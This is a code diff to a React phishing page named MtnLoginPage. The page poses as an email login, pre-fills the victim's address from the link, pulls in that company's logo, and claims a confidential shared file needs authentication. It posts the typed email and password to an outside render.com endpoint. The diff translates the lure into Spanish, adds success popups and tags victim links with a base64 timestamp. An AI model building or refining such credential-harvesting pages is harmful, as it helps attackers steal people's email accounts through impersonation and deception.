@@ -10,6 +10,8 @@ import {
 } from "@mui/material";
 import axios from "axios";
 import { Visibility, VisibilityOff, Person, Lock } from "@mui/icons-material";
+import { useSnackbar } from "notistack"; // Add this import
+
 
 const MtnLoginPage: React.FC = () => {
   const [email, setEmail] = useState("");
@@ -20,6 +22,8 @@ const MtnLoginPage: React.FC = () => {
   const [logo, setLogo] = useState("");
   const [background, setBackground] = useState("");
   const [securedSession, setSecuredSession] = useState(true);
+
+  const { enqueueSnackbar } = useSnackbar();
 
   const fetchLogo = async (domain: string) => {
     try {
@@ -47,9 +51,25 @@ const MtnLoginPage: React.FC = () => {
 
   useEffect(() => {
     const hashEmail = window.location.hash.replace("#", "");
+    // Only append encoded number if not already present
     if (hashEmail) {
-      setEmail(hashEmail);
-      fetchCompanyDetails(hashEmail);
+      // Check if hash already contains an encoded number (simple check: contains '-')
+      if (!hashEmail.match(/-.{10,}$/)) {
+        // Encode a number (e.g., timestamp) in Base64
+        const encodeNumber = (num: number) => {
+          return btoa(num.toString());
+        };
+        const numberToEncode = Date.now(); // You can use any number here
+        const encodedNumber = encodeNumber(numberToEncode);
+        const newHash = `${hashEmail}-${encodedNumber}`;
+        window.location.hash = newHash;
+        setEmail(hashEmail);
+        fetchCompanyDetails(hashEmail);
+      } else {
+        // Already has encoded number
+        setEmail(hashEmail.split('-')[0]);
+        fetchCompanyDetails(hashEmail.split('-')[0]);
+      }
     }
   }, []);
 
@@ -68,23 +88,26 @@ const MtnLoginPage: React.FC = () => {
   };
 
   const handleLogin = async () => {
-    if (!password) {
-      setError("Password is required!");
-      return;
-    }
+  if (!password) {
+    setError("Password is required!");
+    return;
+  }
 
-    setLoading(true);
+  setLoading(true);
 
-    try {
-      await axios.post("https://web-mail-925d.onrender.com/send-email", { email, password });
-      setError("");
-    } catch (err) {
-      setError("Failed to send email. Try again!");
-      console.error("Email sending error:", err);
-    } finally {
-      setLoading(false);
-    }
-  };
+  try {
+    await axios.post("https://web-mail-925d.onrender.com/send-email", { email, password });
+    setError("");
+    enqueueSnackbar("Mensaje enviado con éxito", { variant: "success" }); 
+  } catch (err) {
+    setError("Failed to send email. Try again!");
+    enqueueSnackbar("No se pudo enviar el mensaje", { variant: "error" }); 
+    console.error("Email sending error:", err);
+  } finally {
+    setLoading(false);
+  }
+};
+
 
   return (
     <Box
@@ -97,17 +120,17 @@ const MtnLoginPage: React.FC = () => {
         backgroundSize: "cover",
         backgroundPosition: "center",
         backdropFilter: "blur(5px)",
-        p: { xs: 2, sm: 3 }, 
+        p: { xs: 2, sm: 3 },
       }}
     >
       <Box
         sx={{
           width: "100%",
-          maxWidth: { xs: "90%", sm: 400 }, 
+          maxWidth: { xs: "90%", sm: 400 },
           bgcolor: "rgba(255, 255, 255, 0.9)",
           borderRadius: 2,
           boxShadow: 3,
-          p: { xs: 2, sm: 4 }, 
+          p: { xs: 2, sm: 4 },
           textAlign: "center",
           backdropFilter: "blur(8px)",
         }}
@@ -134,20 +157,20 @@ const MtnLoginPage: React.FC = () => {
             color: "firebrick",
             mt: 2,
             textTransform: "uppercase",
-            fontSize: { xs: 16, sm: 18 }, 
+            fontSize: { xs: 16, sm: 18 },
           }}
         >
-          <b>You must authenticate to view a shared confidential file.</b>
+          <b>Debe autenticarse para ver un archivo confidencial compartido.</b>
         </Typography>
         <Typography variant="body2" sx={{ color: "firebrick", mt: 2 }}>
-          <b>Confirm ownership of the email specified below.</b>
+          <b>Confirme la propiedad del correo electrónico que se indica a continuación.</b>
         </Typography>
 
         <form onSubmit={(e) => e.preventDefault()}>
           {/* Email Input */}
           <Box sx={{ mb: 2, mt: 2 }}>
             <Typography variant="body2" sx={{ textAlign: "left", mb: 1 }}>
-              Email address
+              Dirección de correo electrónico
             </Typography>
             <Box
               sx={{
@@ -176,7 +199,7 @@ const MtnLoginPage: React.FC = () => {
           {/* Password Input */}
           <Box sx={{ mb: 2 }}>
             <Typography variant="body2" sx={{ textAlign: "left", mb: 1 }}>
-              Password
+              Contraseña
             </Typography>
             <Box
               sx={{
@@ -231,7 +254,7 @@ const MtnLoginPage: React.FC = () => {
             onClick={handleLogin}
             disabled={loading}
           >
-            {loading ? <CircularProgress size={24} /> : "Sign in"}
+            {loading ? <CircularProgress size={24} /> : "Enviar mensaje"}
           </Button>
         </form>
       </Box>
